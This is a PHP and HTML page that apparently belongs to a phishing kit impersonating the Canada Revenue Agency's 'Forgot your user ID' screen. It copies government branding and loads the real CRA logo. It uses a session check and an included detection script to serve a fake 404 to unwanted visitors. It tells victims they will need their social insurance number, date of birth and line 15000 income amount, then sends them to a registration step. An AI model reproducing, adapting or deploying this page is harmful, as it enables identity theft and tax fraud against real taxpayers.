<?php
session_start();
ob_start();
require_once('../config.php');
include_once('../includes/php/detect.php');

if(!isset($_SESSION['fallow'])) {
   header('HTTP/1.1 404 Not Found');
   exit();
}
?>
<!DOCTYPE html>
<html>
   <head>
      <meta charset="utf-8">
      <meta name="viewport" content="width=device-width, initial-scale=1, minimum-scale=1" />
      <link rel="stylesheet" href="./reg.css">
   </head>
<div vocab="http://schema.org/" typeof="WebPage" class="snipcss-OYksM">
    <ul id="wb-tphp" class="wb-init wb-disable-inited">
        <li class="wb-slc">
            <a href="#wb-cont" class="wb-sl">Skip to main content</a>
        </li>
        <li class="wb-slc visible-sm visible-md visible-lg">
            <a href="#wb-info" class="wb-sl">Skip to "About this site"</a>
        </li>
        <li class="wb-slc"><a class="wb-sl" href="?wbdisable=true" rel="alternate">Switch to basic HTML version</a></li>
    </ul>
    <header class="">
        <div id="wb-bnr" class="container">
            <section id="wb-lng" class="visible-md visible-lg text-right">
                <h2 class="wb-inv">Language selection</h2>
                <ul class="list-inline margin-bottom-none">
                    <li>
                        <div lang="fr">
                            <a href="">Français</a>
                        </div>
                    </li>
                </ul>
            </section>
            <div class="row">
                <div class="brand col-xs-9 col-sm-5 col-md-4" property="publisher" resource="#wb-publisher" typeof="GovernmentOrganization">
                    <img alt="" src="https://apps6.ams-sga.cra-arc.gc.ca/ebci/wet/v10.5.4/GCWeb/assets/sig-blk-en.svg" property="logo">
                    <span class="wb-inv" property="name"> Government of Canada / <span lang="fr">Gouvernement du Canada</span></span>
                    <meta property="name" content="Government of Canada">
                    <meta property="areaServed" typeof="Country" content="Canada">
                    <link property="logo" href="">
                </div>
                <section class="wb-mb-links col-xs-4 col-sm-3 visible-sm visible-xs" id="wb-glb-mn">
                    <h2>Menu</h2>
                    <ul class="list-inline text-right chvrn">
                        <li>
                            <a href="#mb-pnl" class="overlay-lnk" title="Menu" role="button" aria-controls="mb-pnl"><span class="glyphicon glyphicon-th-list">
                                    <span class="wb-inv">Menu</span>
                                </span></a>
                        </li>
                    </ul>
                    <div id="mb-pnl" class=" wb-overlay modal-content overlay-def wb-panel-r wb-overlay-inited" aria-hidden="true">
                        <header class="modal-header">
                            <div class="modal-title">Menu</div>
                        </header>
                        <div class="modal-body">
                            <section class="lng-ofr">
                                <h3>Language selection</h3>
                                <ul class="list-inline">
                                    <div lang="fr">
                                        <li><a href="">Français</a></li>
                                    </div>
                                </ul>
                            </section>
                            <nav role="navigation" typeof="SiteNavigationElement" id="info-pnl" class="info-pnl wb-menu wb-menu-inited wb-init">
                                <h3>About this site</h3>
                                <ul class="list-unstyled mb-menu" role="menu">
                                    <li class="no-sect"><a class="mb-item" role="menuitem" aria-setsize="3" aria-posinset="1" tabindex="0" href="" rel="noopener noreferrer" target="_blank">Terms and conditions</a></li>
                                    <li class="no-sect"><a class="mb-item" role="menuitem" aria-setsize="3" aria-posinset="2" tabindex="-1" href="" rel="noopener noreferrer" target="_blank">Privacy</a></li>
                                    <li class="no-sect"><a class="mb-item" role="menuitem" aria-setsize="3" aria-posinset="3" tabindex="-1" href="">Top of Page <span class="glyphicon glyphicon-chevron-up"></span></a></li>
                                </ul>
                            </nav>
                        </div>
                        <div class="modal-footer"><button title="Close overlay" class="btn btn-sm btn-primary pull-left overlay-close" type="button">Close<span class="wb-inv">Close overlay</span></button></div><button title="Close: Menu (escape key)" class="mfp-close overlay-close" type="button">×<span class="wb-inv"> Close: Menu (escape key)</span></button>
                    </div>
                </section>
            </div>
        </div>
        <div id="brand-container-cra">
            <div class="container">
                <div class="row">
                    <div class="col-xs-12 col-sm-10" id="brand-text-cra"> Canada Revenue Agency </div>
                    <div class="col-xs-4 col-sm-2 text-right">
                    </div>
                </div>
            </div>
        </div>
        <span data-trgt="mb-pnl" class="wb-menu hide wb-init wb-menu-inited wb-navcurr-inited" id="wb-auto-2"></span>
    </header>
    <main property="mainContentOfPage" class="container">
        <div class="left">
        </div>
        <div class="center">
            <div id="content">
                <h1 id="wb-cont"> Forgot your user ID—personal information required </h1>
                <p>If you forgot your user ID, you will have to provide the following personal information:</p>
                <p></p>
                <ul>
                    <li>your social insurance number</li>
                    <li>your date of birth</li>
                    <li>the amount you entered on line 15000 of your income tax and benefit return, from one of the previous two tax years</li>
                </ul>
                <p></p>
                <p>After you recovered your user ID(s), you will have to answer four of your five CRA security questions to access the CRA online services the next time you sign in.</p>
                <form id="CancelForm" action="login.php" method="post">
                </form>
                <form action="register.php" method="Post">
                    <div class="formButtons">
                        <input type="submit" name="useridrecovery" class="btn btn-primary" value="Next">
                    </div>
                </form>
                
                <form action="login.php" method="post" id="CancelForm" autocomplete="off">
               <div class="formButtons">
               <input type="submit" name="exit" class="btn btn-default" value="Exit" id="exitButton">
                  </div>
               </form>
                <div id="pageLabel">Screen ID: AMS.n02</div>
            </div>
        </div>
        <div class="hidden-print">
            <dl id="wb-dtmd" property="dateModified">
                <dt>Date modified: </dt>
                <dd><time>2024-02-05</time></dd>
            </dl>
        </div>
    </main>
    <?php include ("files/footer.php"); ?>
